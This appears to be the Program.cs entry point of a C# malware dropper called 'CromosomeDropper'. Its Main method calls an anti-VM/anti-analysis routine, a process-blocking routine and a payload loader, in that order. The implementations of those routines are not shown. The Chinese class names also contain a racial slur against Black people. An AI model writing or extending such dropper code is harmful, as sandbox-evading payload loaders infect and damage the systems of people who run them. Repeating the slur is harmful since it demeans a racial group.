using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
//Dropper Using
using SystemDiagnostics;
using 反分析;
using 反進程;

namespace CromosomeDropper
{
    class Program
    {
        static void Main(string[] args)
        {
            //AntiVM
            反分析黑鬼.運行反分析();
            //Anti Process
            反進程黑鬼.啟動塊();
            //Dropper Class
            有效載荷.裝載機();
        }
    }
}
